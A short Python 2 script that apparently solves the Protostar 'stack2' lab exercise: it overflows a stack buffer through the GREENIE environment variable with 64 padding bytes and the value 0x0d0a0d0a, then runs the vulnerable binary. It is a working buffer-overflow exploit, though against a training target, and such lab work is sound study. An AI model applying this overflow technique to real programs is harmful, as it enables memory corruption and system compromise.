#!/usr/bin/env python2.6

import os
import subprocess

buff = "AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVVWWWXXXYYYZZZ111222333444555666777888999000"

value = '\x0a\x0d\x0a\x0d'

os.environ['GREENIE'] = buff[:64] + value
popen = subprocess.Popen("/opt/protostar/bin/stack2", stdout=subprocess.PIPE)
popen.wait()
output = popen.stdout.read()
print output
